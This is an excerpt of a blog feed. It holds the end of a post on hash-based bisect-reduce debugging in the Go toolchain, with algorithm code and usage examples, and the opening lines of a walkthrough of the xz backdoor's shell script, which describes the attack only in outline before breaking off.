needed.&#xA;&lt;li&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;If the target list is a single entry, that entry is what’s needed:&#xA;we can return a single-element list.&#xA;&lt;li&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Otherwise, the recursive case: split the target list in half&#xA;and reduce each side separately. Note that it is important to&#xA;force &lt;code&gt;leftReduced&lt;/code&gt; (not &lt;code&gt;left&lt;/code&gt;) while reducing &lt;code&gt;right&lt;/code&gt;.&lt;/ul&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Applied to the function optimization example, &lt;code&gt;BisectReduce&lt;/code&gt; would end up at a&#xA;call to&#xA;&lt;pre&gt;bisect([add cos div exp mod mul sin sqr sub tan], [])&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;which would split the targets list into&#xA;&lt;pre&gt;left = [add cos div exp mod]&#xA;right = [mul sin sqr sub tan]&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The recursive calls compute:&#xA;&lt;pre&gt;bisect([add cos div exp mod], [mul sin sqr sub tan]) = [cos]&#xA;bisect([mul sin sqr sub tan], [cos]) = [sin]&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Then the &lt;code&gt;return&lt;/code&gt; puts the two halves together: &lt;code&gt;[cos sin]&lt;/code&gt;.&#xA;&#xA;&lt;p&gt;&#xA;The version of &lt;code&gt;BisectReduce&lt;/code&gt; we have been considering is the shortest&#xA;one I know; let’s call it the “short algorithm”.&#xA;A longer version handles the “easy” case of the bug being&#xA;contained in one half before the “hard” one of needing&#xA;parts of both halves.&#xA;Let’s call it the “easy/hard algorithm”:&#xA;&lt;pre&gt;// BisectReduce returns a locally minimal subset x of targets&#xA;// where buggy(x) is true, assuming that buggy(targets) is true.&#xA;func BisectReduce(targets []string) []string {&#xA;    if len(targets) == 0 || buggy(nil) {&#xA;        return nil&#xA;    }&#xA;    return bisect(targets, []string{})&#xA;}&#xA;&#xA;// bisect returns a locally minimal subset x of targets&#xA;// where buggy(x+forced) is true, assuming that&#xA;// buggy(targets+forced) is true.&#xA;//&#xA;// Precondition: buggy(targets+forced) = true,&#xA;// and buggy(forced) = false.&#xA;//&#xA;// Postcondition: buggy(result+forced) = true,&#xA;// and buggy(x+forced) = false for any x ⊂ result.&#xA;// Also, if there are any valid single-element results,&#xA;// then bisect returns one of them.&#xA;func bisect(targets []string, forced []string) []string {&#xA;    if len(targets) == 1 {&#xA;        // Reduced list to a single required entry.&#xA;        return []string{targets[0]}&#xA;    }&#xA;&#xA;    // Split targets in half.&#xA;    m := len(targets)/2&#xA;    left, right := targets[:m], targets[m:]&#xA;&#xA;    // If either half is sufficient by itself, focus there.&#xA;    if buggy(slices.Concat(left, forced)) {&#xA;        return bisect(left, forced)&#xA;    }&#xA;    if buggy(slices.Concat(right, forced)) {&#xA;        return bisect(right, forced)&#xA;    }&#xA;&#xA;    // Otherwise need parts of both halves.&#xA;    leftReduced := bisect(left, slices.Concat(right, forced))&#xA;    rightReduced := bisect(right, slices.Concat(leftReduced, forced))&#xA;    return slices.Concat(leftReduced, rightReduced)&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The easy/hard algorithm has two benefits and one drawback compared to the short algorithm.&#xA;&#xA;&lt;p&gt;&#xA;One benefit is that the easy/hard algorithm more directly maps to our intuitions&#xA;about what bisecting should do:&#xA;try one side, try the other, fall back to some combination of both sides.&#xA;In contrast, the short algorithm always relies on the general case&#xA;and is harder to understand.&#xA;&#xA;&lt;p&gt;&#xA;Another benefit of the easy/hard algorithm is that&#xA;it guarantees to find a single-culprit answer when one exists.&#xA;Since most bugs can be reduced to a single culprit,&#xA;guaranteeing to find one when one exists makes for&#xA;easier debugging sessions.&#xA;Supposing that optimizing &lt;code&gt;tan&lt;/code&gt; would have triggered&#xA;the test failure,&#xA;the easy/hard algorithm would try&#xA;&lt;pre&gt;buggy([add cos div exp mod]) = false // left&#xA;buggy([mul sin sqr sub tan]) = true  // right&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;and then would discard the left side, focusing on the right side&#xA;and eventually finding &lt;code&gt;[tan]&lt;/code&gt;, instead of &lt;code&gt;[sin cos]&lt;/code&gt;.&#xA;&#xA;&lt;p&gt;&#xA;The drawback is that because the easy/hard algorithm doesn’t often rely&#xA;on the general case, the general case needs more careful testing&#xA;and is easier to get wrong without noticing.&#xA;For example, Andreas Zeller’s 1999 paper&#xA;“&lt;a href=&#34;https://dl.acm.org/doi/10.1145/318774.318946&#34;&gt;Yesterday, my program worked. Today, it does not. Why?&lt;/a&gt;”&#xA;gives what should be the easy/hard version of the bisect-reduce algorithm&#xA;as a way to bisect over independent program changes,&#xA;except that the algorithm has a bug:&#xA;in the “hard” case, the &lt;code&gt;right&lt;/code&gt; bisection forces &lt;code&gt;left&lt;/code&gt; instead of &lt;code&gt;leftReduced&lt;/code&gt;.&#xA;The result is that if there are two culprit pairs crossing&#xA;the &lt;code&gt;left&lt;/code&gt;/&lt;code&gt;right&lt;/code&gt; boundary, the reductions can&#xA;choose one culprit from each pair instead of a matched pair.&#xA;Simple test cases are all handled by the easy case, masking the bug.&#xA;In contrast, if we insert the same bug into the general case of the short algorithm,&#xA;very simple test cases fail.&#xA;&#xA;&lt;p&gt;&#xA;Real implementations are better served by the easy/hard algorithm,&#xA;but they must take care to implement it correctly.&#xA;&lt;a class=anchor href=&#34;#list-based_bisect-reduce&#34;&gt;&lt;h2 id=&#34;list-based_bisect-reduce&#34;&gt;List-Based Bisect-Reduce&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Having established the algorithm, let’s now turn to&#xA;the details of hooking it up to a compiler.&#xA;Exactly how do we obtain the list of source locations,&#xA;and how do we feed it back into the compiler?&#xA;&#xA;&lt;p&gt;&#xA;The most direct answer is to implement one debug mode&#xA;that prints the full list of locations for the optimization&#xA;in question&#xA;and another debug mode that accepts a list&#xA;indicating where the optimization is permitted.&#xA;&lt;a href=&#34;https://bernsteinbear.com/blog/cinder-jit-bisect/&#34;&gt;Meta’s Cinder JIT for Python&lt;/a&gt;,&#xA;published in 2021,&#xA;takes this approach for deciding which functions to compile with the JIT&#xA;(as opposed to interpret).&#xA;Its &lt;a href=&#34;https://github.com/facebookincubator/cinder/blob/cinder/3.10/Tools/scripts/jitlist_bisect.py&#34;&gt;&lt;code&gt;Tools/scripts/jitlist_bisect.py&lt;/code&gt;&lt;/a&gt;&#xA;is the earliest correct published version of the bisect-reduce algorithm&#xA;that I’m aware of,&#xA;using the easy/hard form.&#xA;&#xA;&lt;p&gt;&#xA;The only downside to this approach is the potential size of the lists,&#xA;especially since bisect debugging is critical for reducing&#xA;failures in very large programs.&#xA;If there is some way to reduce the amount of data that must be&#xA;sent back to the compiler on each iteration, that would be helpful.&#xA;In complex build systems, the function lists may be too large&#xA;to pass on the command line or in an environment variable,&#xA;and it may be difficult or even impossible to arrange for a new input file&#xA;to be passed to every compiler invocation.&#xA;An approach that can specify the target list as a short command line argument&#xA;will be easier to use in practice.&#xA;&lt;a class=anchor href=&#34;#counter-based_bisect-reduce&#34;&gt;&lt;h2 id=&#34;counter-based_bisect-reduce&#34;&gt;Counter-Based Bisect-Reduce&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Java’s HotSpot C2 just-in-time (JIT) compiler provided a&#xA;debug mechanism to control which functions to compile with the JIT,&#xA;but instead of using an explicit list of functions like in Cinder,&#xA;HotSpot numbered the functions as it considered them.&#xA;The compiler flags &lt;code&gt;-XX:CIStart&lt;/code&gt; and &lt;code&gt;-XX:CIStop&lt;/code&gt; set the&#xA;range of function numbers that were eligible to be compiled.&#xA;Those flags are&#xA;&lt;a href=&#34;https://github.com/openjdk/jdk/blob/151ef5d4d261c9fc740d3ccd64a70d3b9ccc1ab5/src/hotspot/share/compiler/compileBroker.cpp#L1569&#34;&gt;still present today (in debug builds)&lt;/a&gt;,&#xA;and you can find uses of them in&#xA;&lt;a href=&#34;https://bugs.java.com/bugdatabase/view_bug?bug_id=4311720&#34;&gt;Java bug reports dating back at least to early 2000&lt;/a&gt;.&#xA;&#xA;&lt;p&gt;&#xA;There are at least two limitations to numbering functions.&#xA;&#xA;&lt;p&gt;&#xA;The first limitation is minor and easily fixed:&#xA;allowing only a single contiguous range&#xA;enables binary search for a single culprit but&#xA;not the general bisect-reduce for multiple culprits.&#xA;To enable bisect-reduce, it would suffice&#xA;to accept a list of integer ranges, like &lt;code&gt;-XX:CIAllow=1-5,7-10,12,15&lt;/code&gt;.&#xA;&#xA;&lt;p&gt;&#xA;The second limitation is more serious:&#xA;it can be difficult to keep the numbering stable from run to run.&#xA;Implementation strategies like compiling functions in parallel&#xA;might mean considering functions in varying orders based&#xA;on thread interleaving.&#xA;In the context of a JIT, even threaded runtime execution&#xA;might change the order that functions are considered for compilation.&#xA;Twenty-five years ago, threads were rarely used and this limitation may not have been&#xA;much of a problem.&#xA;Today, assuming a consistent function numbering is a show-stopper.&#xA;&lt;a class=anchor href=&#34;#hash-based_bisect-reduce&#34;&gt;&lt;h2 id=&#34;hash-based_bisect-reduce&#34;&gt;Hash-Based Bisect-Reduce&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;A different way to keep the location list implicit is to&#xA;hash each location to a (random-looking) integer and then&#xA;use bit suffixes to identify sets of locations.&#xA;The hash computation does not depend on the sequence&#xA;in which the source locations are encountered,&#xA;making hashing compatible with&#xA;parallel compilation, thread interleaving, and so on.&#xA;The hashes effectively arrange the functions&#xA;into a binary tree:&#xA;&#xA;&lt;p&gt;&#xA;&lt;img name=&#34;hashbisect1&#34; class=&#34;center pad&#34; width=817 height=411 src=&#34;hashbisect1.png&#34; srcset=&#34;hashbisect1.png 1x, hashbisect1@1.5x.png 1.5x, hashbisect1@2x.png 2x, hashbisect1@3x.png 3x&#34;&gt;&#xA;&#xA;&lt;p&gt;&#xA;Looking for a single culprit is a basic walk down the tree.&#xA;Even better, the general bisect-reduce algorithm is easily&#xA;adapted to hash suffix patterns.&#xA;First we have to adjust the definition of &lt;code&gt;buggy&lt;/code&gt;:&#xA;we need it to tell us the number of matches for the&#xA;suffix we are considering, so we know whether&#xA;we can stop reducing the case:&#xA;&lt;pre&gt;// buggy reports whether the bug is triggered&#xA;// by enabling the change at the locations with&#xA;// hashes ending in suffix or any of the extra suffixes.&#xA;// It also returns the number of locations found that&#xA;// end in suffix (only suffix, ignoring extra).&#xA;func buggy(suffix string, extra []string) (fail bool, n int)&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Now we can translate the easy/hard algorithm more or less directly:&#xA;&lt;pre&gt;// BisectReduce returns a locally minimal list of hash suffixes,&#xA;// each of which uniquely identifies a single location hash,&#xA;// such that buggy(list) is true.&#xA;func BisectReduce() []string {&#xA;    if fail, _ := buggy(&#34;none&#34;, nil); fail {&#xA;        return nil&#xA;    }&#xA;    return bisect(&#34;&#34;, []string{})&#xA;}&#xA;&#xA;// bisect returns a locally minimal list of hash suffixes,&#xA;// each of which uniquely identifies a single location hash,&#xA;// and all of which end in suffix,&#xA;// such that buggy(result+forced) = true.&#xA;//&#xA;// Precondition: buggy(suffix, forced) = true, _.&#xA;// and buggy(&#34;none&#34;, forced) = false, 0.&#xA;//&#xA;// Postcondition: buggy(&#34;none&#34;, result+forced) = true, 0;&#xA;// each suffix in result matches a single location hash;&#xA;// and buggy(&#34;none&#34;, x+forced) = false for any x ⊂ result.&#xA;// Also, if there are any valid single-element results,&#xA;// then bisect returns one of them.&#xA;func bisect(suffix string, forced []string) []string {&#xA;    if _, n := buggy(suffix, forced); n == 1 {&#xA;        // Suffix identifies a single location.&#xA;        return []string{suffix}&#xA;    }&#xA;&#xA;    // If either of 0suffix or 1suffix is sufficient&#xA;    // by itself, focus there.&#xA;    if fail, _ := buggy(&#34;0&#34;+suffix, forced); fail {&#xA;        return bisect(&#34;0&#34;+suffix, forced)&#xA;    }&#xA;    if fail, _ := buggy(&#34;1&#34;+suffix, forced); fail {&#xA;        return bisect(&#34;1&#34;+suffix, forced)&#xA;    }&#xA;&#xA;    // Matches from both extensions are needed.&#xA;    // Otherwise need parts of both halves.&#xA;    leftReduced := bisect(&#34;0&#34;+suffix,&#xA;        slices.Concat([]string{&#34;1&#34;+suffix&#34;}, forced))&#xA;    rightReduced := bisect(&#34;1&#34;+suffix,&#xA;        slices.Concat(leftReduced, forced))&#xA;    return slices.Concat(leftReduce, rightReduce)&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Careful readers might note that in the easy cases,&#xA;the recursive call to &lt;code&gt;bisect&lt;/code&gt; starts by repeating the same&#xA;call to &lt;code&gt;buggy&lt;/code&gt; that the caller did,&#xA;this time to count the number of matches for the suffix in question.&#xA;An efficient implementation could pass the result of that run to&#xA;the recursive call, avoiding redundant trials.&#xA;&#xA;&lt;p&gt;&#xA;In this version, &lt;code&gt;bisect&lt;/code&gt; does not guarantee to cut the search space in half&#xA;at each level of the recursion.&#xA;Instead, the randomness of the hashes means that it cuts the search space&#xA;roughly in half on average.&#xA;That’s still enough for logarithmic behavior when there are&#xA;just a few culprits.&#xA;The algorithm would also work correctly if the suffixes were&#xA;applied to match a consistent sequential numbering instead of hashes;&#xA;the only problem is obtaining the numbering.&#xA;&#xA;&lt;p&gt;&#xA;The hash suffixes are about as short as the function number ranges&#xA;and easily passed on the command line.&#xA;For example, a hypothetical Java compiler could use &lt;code&gt;-XX:CIAllowHash=000,10,111&lt;/code&gt;.&#xA;&lt;a class=anchor href=&#34;#use_case&#34;&gt;&lt;h2 id=&#34;use_case&#34;&gt;Use Case: Function Selection&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The earliest use of hash-based bisect-reduce in Go was for&#xA;selecting functions, as in the example we’ve been considering.&#xA;In 2015, Keith Randall was working on a new SSA backend for the Go&#xA;compiler. The old and new backends coexisted, and the compiler&#xA;could use either for any given function in the program being compiled.&#xA;Keith introduced an&#xA;&lt;a href=&#34;https://go.googlesource.com/go/+/e3869a6b65bb0f95dac7eca3d86055160b12589f&#34;&gt;environment variable GOSSAHASH&lt;/a&gt;&#xA;that specified the last few binary&#xA;digits of the hash of function names that should use the new backend:&#xA;GOSSAHASH=0110 meant “compile only those functions whose names hash&#xA;to a value with last four bits 0110.”&#xA;When a test was failing with the new backend,&#xA;a person debugging the test case&#xA;tried GOSSAHASH=0 and GOSSAHASH=1 and then used binary&#xA;search to progressively refine the pattern, narrowing the failure down&#xA;until only a single function was being compiled with the new backend.&#xA;This was invaluable for approaching failures in large real-world tests&#xA;(tests for libraries or production code, not for the compiler) that we&#xA;had not written and did not understand.&#xA;The approach assumed that the failure could always be reduced to&#xA;a single culprit function.&#xA;&#xA;&lt;p&gt;&#xA;It is fascinating that HotSpot, Cinder, and Go all hit upon the idea&#xA;of binary search to find miscompiled functions in a compiler,&#xA;and yet all three used different selection mechanisms&#xA;(counters, function lists, and hashes).&#xA;&lt;a class=anchor href=&#34;#use_case&#34;&gt;&lt;h2 id=&#34;use_case&#34;&gt;Use Case: SSA Rewrite Selection&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;In late 2016, David Chase was debugging a new optimizer rewrite rule that&#xA;should have been correct but was causing mysterious test failures.&#xA;He &lt;a href=&#34;https://go-review.googlesource.com/29273&#34;&gt;reused the same technique&lt;/a&gt;&#xA;but at finer granularity:&#xA;the bit pattern now controlled which functions that rewrite rule&#xA;could be used in.&#xA;&#xA;&lt;p&gt;&#xA;David also wrote the &lt;a href=&#34;https://github.com/dr2chase/gossahash/tree/e0bba144af8b1cc8325650ea8fbe3a5c946eb138&#34;&gt;initial version of a tool, &lt;code&gt;gossahash&lt;/code&gt;&lt;/a&gt;,&#xA;for taking on the job of binary search.&#xA;Although &lt;code&gt;gossahash&lt;/code&gt; only looked for a single failure, but it was remarkably helpful.&#xA;It served for many years and eventually became &lt;code&gt;bisect&lt;/code&gt;.&#xA;&lt;a class=anchor href=&#34;#use_case&#34;&gt;&lt;h2 id=&#34;use_case&#34;&gt;Use Case: Fused Multiply-Add&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Having a tool available, instead of needing to bisect manually,&#xA;made us keep finding problems we could solve.&#xA;In 2022, another presented itself.&#xA;We had updated the Go compiler to use floating-point fused multiply-add (FMA)&#xA;instructions on a new architecture, and some tests were failing.&#xA;By making the FMA rewrite conditional on a suffix of a hash that&#xA;included the current file name and line number,&#xA;we could apply bisect-reduce to identify the specific line in the source code&#xA;where FMA instruction broke the test.&#xA;&#xA;&lt;p&gt;&#xA;For example, this bisection finds that &lt;code&gt;b.go:7&lt;/code&gt; is the culprit line:&#xA;&#xA;&lt;p&gt;&#xA;&lt;img name=&#34;hashbisect0&#34; class=&#34;center pad&#34; width=254 height=218 src=&#34;hashbisect0.png&#34; srcset=&#34;hashbisect0.png 1x, hashbisect0@1.5x.png 1.5x, hashbisect0@2x.png 2x, hashbisect0@3x.png 3x, hashbisect0@4x.png 4x&#34;&gt;&#xA;&#xA;&lt;p&gt;&#xA;FMA is not something most programmers encounter.&#xA;If they do get an FMA-induced test failure, having a tool that automatically&#xA;identifies the exact culprit line is invaluable.&#xA;&lt;a class=anchor href=&#34;#use_case&#34;&gt;&lt;h2 id=&#34;use_case&#34;&gt;Use Case: Language Changes&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The next problem that presented itself was a language change.&#xA;Go, like C# and JavaScript, learned the hard way that loop-scoped loop variables&#xA;don’t mix well with closures and concurrency.&#xA;Like those languages, Go recently changed to &lt;a href=&#34;https://go.dev/blog/loopvar-preview&#34;&gt;iteration-scoped loop variables&lt;/a&gt;,&#xA;correcting many buggy programs in the process.&#xA;&#xA;&lt;p&gt;&#xA;Unfortunately, sometimes tests unintentionally check for buggy behavior.&#xA;Deploying the loop change in a large code base, we confronted truly&#xA;mysterious failures in complex, unfamiliar code.&#xA;Conditioning the loop change on a suffix of a hash of the source file name and line number&#xA;enabled bisect-reduce to pinpoint the specific loop or loops that triggered&#xA;the test failures.&#xA;We even found a few cases where changing any one loop did not&#xA;cause a failure, but changing a specific pair of loops did.&#xA;The generality of finding multiple culprits is necessary in practice.&#xA;&#xA;&lt;p&gt;&#xA;The loop change would have been far more difficult without&#xA;automated diagnosis.&#xA;&lt;a class=anchor href=&#34;#use_case&#34;&gt;&lt;h2 id=&#34;use_case&#34;&gt;Use Case: Library Changes&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Bisect-reduce also applies to library changes:&#xA;we can hash the caller, or more precisely the call stack,&#xA;and then choose between the old and new implementation&#xA;based on a hash suffix.&#xA;&#xA;&lt;p&gt;&#xA;For example, suppose you add a new sort implementation and&#xA;a large program fails.&#xA;Assuming the sort is correct, the problem is almost certainly that&#xA;the new sort and the old sort disagree about the final order of&#xA;some values that compare equal.&#xA;Or maybe the sort is buggy.&#xA;Either way, the large program probably calls sort in many different places.&#xA;Running bisect-reduce over hashes of the call stacks&#xA;will identify the exact call stack where using the new sort causes a failure.&#xA;This is what was happening in the example at the start of the post,&#xA;with a new timer implementation instead of a new sort.&#xA;&#xA;&lt;p&gt;&#xA;Call stacks are a use case that only works with hashing,&#xA;not with sequential numbering.&#xA;For the examples up to this point, a setup pass could number all&#xA;the functions in a program or number all the source lines presented&#xA;to the compiler, and then bisect-reduce could apply to binary suffixes&#xA;of the sequence number.&#xA;But there is no dense sequential numbering of all the possible call stacks&#xA;a program will encounter.&#xA;On the other hand, hashing a list of program counters is trivial.&#xA;&#xA;&lt;p&gt;&#xA;We realized that bisect-reduce would apply to library changes&#xA;around the time we were introducing the&#xA;&lt;a href=&#34;https://go.dev/doc/godebug&#34;&gt;GODEBUG mechanism&lt;/a&gt;,&#xA;which provides a framework for tracking and toggling these kinds of&#xA;compatible-but-breaking changes.&#xA;We arranged for that framework to provide &lt;code&gt;bisect&lt;/code&gt; support for all&#xA;GODEBUG settings automatically.&#xA;&#xA;&lt;p&gt;&#xA;For Go 1.23, we rewrote the &lt;a href=&#34;https://go.dev/pkg/time/#Timer&#34;&gt;time.Timer&lt;/a&gt;&#xA;implementation and changed its semantics slightly,&#xA;to remove some races in existing APIs&#xA;and also enable earlier garbage collection in some common cases.&#xA;One effect of the new implementation is that very short timers trigger more reliably.&#xA;Before, a 0ns or 1ns timer (which are often used in tests) could take&#xA;many microseconds to trigger.&#xA;Now, they trigger on time.&#xA;But of course, buggy code (mostly in tests) exists that fails&#xA;when the timers start triggering as early as they should.&#xA;We debugged a dozen or so of these inside Google’s source tree—all of them complex and unfamiliar—and&#xA;&lt;code&gt;bisect&lt;/code&gt; made the process painless and maybe even fun.&#xA;&#xA;&lt;p&gt;&#xA;For one failing test case, I made a mistake.&#xA;The test looked simple enough to eyeball, so I spent&#xA;half an hour puzzling through how the only timer in the code under test,&#xA;a hard-coded one minute timer,&#xA;could possibly be affected by the new implementation.&#xA;Eventually I gave up and ran &lt;code&gt;bisect&lt;/code&gt;.&#xA;The stack trace showed immediately that there was a testing middleware layer that&#xA;was rewriting the one-minute timeout&#xA;into a 1ns timeout to speed the test.&#xA;Tools see what people cannot.&#xA;&lt;a class=anchor href=&#34;#interesting_lessons_learned&#34;&gt;&lt;h2 id=&#34;interesting_lessons_learned&#34;&gt;Interesting Lessons Learned&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;One interesting thing we learned while working on &lt;code&gt;bisect&lt;/code&gt; is that it is&#xA;important to try to detect flaky tests.&#xA;Early in debugging loop change failures,&#xA;&lt;code&gt;bisect&lt;/code&gt; pointed at a completely correct, trivial loop in a cryptography package.&#xA;At first, we were very scared: if &lt;i&gt;that&lt;/i&gt; loop was changing behavior,&#xA;something would have to be very wrong in the compiler.&#xA;We realized the problem was flaky tests. A test that fails randomly&#xA;causes &lt;code&gt;bisect&lt;/code&gt; to make a random walk over the source code,&#xA;eventually pointing a finger at entirely innocent code.&#xA;After that, we added a &lt;code&gt;-count=N&lt;/code&gt; flag to &lt;code&gt;bisect&lt;/code&gt; that causes it&#xA;to run every trial &lt;i&gt;N&lt;/i&gt; times and bail out entirely if they disagree.&#xA;We set the default to &lt;code&gt;-count=2&lt;/code&gt; so that &lt;code&gt;bisect&lt;/code&gt; always does basic&#xA;flakiness checking.&#xA;&#xA;&lt;p&gt;&#xA;Flaky tests remain an area that needs more work. If the problem being debugged&#xA;is that a test went from passing reliably to failing half the time,&#xA;running &lt;code&gt;go test -count=5&lt;/code&gt; increases the chance of failure by running the test five times.&#xA;Equivalently, it can help to use a tiny shell script like&#xA;&lt;pre&gt;% cat bin/allpass&#xA;#!/bin/sh&#xA;n=$1&#xA;shift&#xA;for i in $(seq $n); do&#xA;    &#34;$@&#34; || exit 1&#xA;done&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Then &lt;code&gt;bisect&lt;/code&gt; can be invoked as:&#xA;&lt;pre&gt;% bisect -godebug=timer allpass 5 ./flakytest&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Now bisect only sees &lt;code&gt;./flakytest&lt;/code&gt; passing five times in a row as a successful run.&#xA;&#xA;&lt;p&gt;&#xA;Similarly, if a test goes from passing unreliably to failing all the time,&#xA;an &lt;code&gt;anypass&lt;/code&gt; variant works instead:&#xA;&lt;pre&gt;% cat bin/anypass&#xA;#!/bin/sh&#xA;n=$1&#xA;shift&#xA;for i in $(seq $n); do&#xA;    &#34;$@&#34; &amp;amp;&amp;amp; exit 0&#xA;done&#xA;exit 1&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The &lt;a href=&#34;https://man7.org/linux/man-pages/man1/timeout.1.html&#34;&gt;&lt;code&gt;timeout&lt;/code&gt; command&lt;/a&gt;&#xA;is also useful if the change has made a test run forever instead of failing.&#xA;&#xA;&lt;p&gt;&#xA;The tool-based approach to handling flakiness works decently&#xA;but does not seem like a complete solution.&#xA;A more principled approach inside &lt;code&gt;bisect&lt;/code&gt; would be better.&#xA;We are still working out what that would be.&#xA;&#xA;&lt;p&gt;&#xA;Another interesting thing we learned is that when bisecting over&#xA;run-time changes, hash decisions are made so frequently that&#xA;it is too expensive to print the full stack trace of every decision&#xA;made at every stage of the bisect-reduce,&#xA;(The first run uses an empty suffix that matches every hash!)&#xA;Instead, bisect hash patterns default to a “quiet” mode where each&#xA;decision prints only the hash bits, since that’s all &lt;code&gt;bisect&lt;/code&gt; needs&#xA;to guide the search and narrow down the relevant stacks.&#xA;Once &lt;code&gt;bisect&lt;/code&gt; has identified a minimal set of relevant stacks,&#xA;it runs the test once more with the hash pattern in “verbose” mode.&#xA;That causes the bisect library to print both the hash bits&#xA;and the corresponding stack traces,&#xA;and &lt;code&gt;bisect&lt;/code&gt; displays those stack traces in its report.&#xA;&lt;a class=anchor href=&#34;#try_bisect&#34;&gt;&lt;h2 id=&#34;try_bisect&#34;&gt;Try Bisect&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The &lt;a href=&#34;https://pkg.go.dev/golang.org/x/tools/cmd/bisect&#34;&gt;&lt;code&gt;bisect&lt;/code&gt; tool&lt;/a&gt;&#xA;can be downloaded and used today:&#xA;&lt;pre&gt;% go install golang.org/x/tools/cmd/bisect@latest&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;If you are debugging a &lt;a href=&#34;https://go.dev/wiki/LoopvarExperiment&#34;&gt;loop variable problem&lt;/a&gt; in Go 1.22, you can use&#xA;a command like&#xA;&lt;pre&gt;% bisect -compile=loopvar go test&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;If you are debugging a &lt;a href=&#34;https://go.dev/change/966609ad9e82ba173bcc8f57f4bfc35a86a62c8a&#34;&gt;timer problem in Go 1.23&lt;/a&gt;, you can use:&#xA;&lt;pre&gt;% bisect -godebug asynctimerchan=1 go test&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The &lt;code&gt;-compile&lt;/code&gt; and &lt;code&gt;-godebug&lt;/code&gt; flags are conveniences.&#xA;The general form of the command is&#xA;&lt;pre&gt;% bisect [KEY=value...] cmd [args...]&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;where the leading &lt;code&gt;KEY=value&lt;/code&gt; arguments set environment variables&#xA;before invoking the command with the remaining arguments.&#xA;&lt;code&gt;Bisect&lt;/code&gt; expects to find the literal string &lt;code&gt;PATTERN&lt;/code&gt; somewhere&#xA;on its command line, and it replaces that string with a hash pattern&#xA;each time it repeats the command.&#xA;&#xA;&lt;p&gt;&#xA;You can use &lt;code&gt;bisect&lt;/code&gt; to debug problems in your own compilers or libraries&#xA;by having them accept a hash pattern either in the environment or on&#xA;the command line and then print specially formatted lines for &lt;code&gt;bisect&lt;/code&gt;&#xA;on standard output or standard error.&#xA;The easiest way to do this is to use&#xA;&lt;a href=&#34;https://pkg.go.dev/golang.org/x/tools/internal/bisect&#34;&gt;the bisect package&lt;/a&gt;.&#xA;That package is not available for direct import yet&#xA;(there is a &lt;a href=&#34;https://go.dev/issue/67140&#34;&gt;pending proposal&lt;/a&gt; to add it to the Go standard library),&#xA;but the package is only a &lt;a href=&#34;https://cs.opensource.google/go/x/tools/+/master:internal/bisect/bisect.go&#34;&gt;single file with no imports&lt;/a&gt;,&#xA;so it is easily copied into new projects or even translated to other languages.&#xA;The package documentation also documents the hash pattern syntax&#xA;and required output format.&#xA;&#xA;&lt;p&gt;&#xA;If you work on compilers or libraries and ever need to debug why&#xA;a seemingly correct change you made broke a complex program,&#xA;give &lt;code&gt;bisect&lt;/code&gt; a try.&#xA;It never stops feeling like magic.&#xA;</content>
  </entry>
  <entry>
    <title>The xz attack shell script</title>
    <id>tag:research.swtch.com,2012:research.swtch.com/xz-script</id>
    <link rel="alternate" href="http://research.swtch.com/xz-script"></link>
    <published>2024-04-02T04:00:00-04:00</published>
    <updated>2024-04-03T11:02:00-04:00</updated>
    <summary type="text">A detailed walkthrough of the xz attack shell script.</summary>
    <content type="html">&lt;a class=anchor href=&#34;#introduction&#34;&gt;&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Andres Freund &lt;a href=&#34;https://www.openwall.com/lists/oss-security/2024/03/29/4&#34;&gt;published the existence of the xz attack&lt;/a&gt; on 2024-03-29 to the public oss-security@openwall mailing list. The day before, he alerted Debian security and the (private) distros@openwall list. In his mail, he says that he dug into this after “observing a few odd symptoms around liblzma (part of the xz package) on Debian sid installations over the last weeks (logins with ssh taking a lot of CPU, valgrind errors).”&#xA;&#xA;&lt;p&gt;&#xA;At a high level, the attack is split in two pieces: a shell script and an object file. There is an injection of shell code during &lt;code&gt;configure&lt;/code&gt;, which injects the shell code into &lt;code&gt;make&lt;/code&gt;. The shell code during &lt;code&gt;make&lt;/code&gt; adds the object file to the build. This post examines the shell script. (See also &lt;a href=&#34;xz-timeline&#34;&gt;my timeline post&lt;/a&gt;.)&#xA;&#xA;&lt;p&gt;&#xA;The nefarious object file would have looked suspicious checked into the repository as &lt;code&gt;evil.o&lt;/code&gt;, so instead both the nefarious shell code and object file are 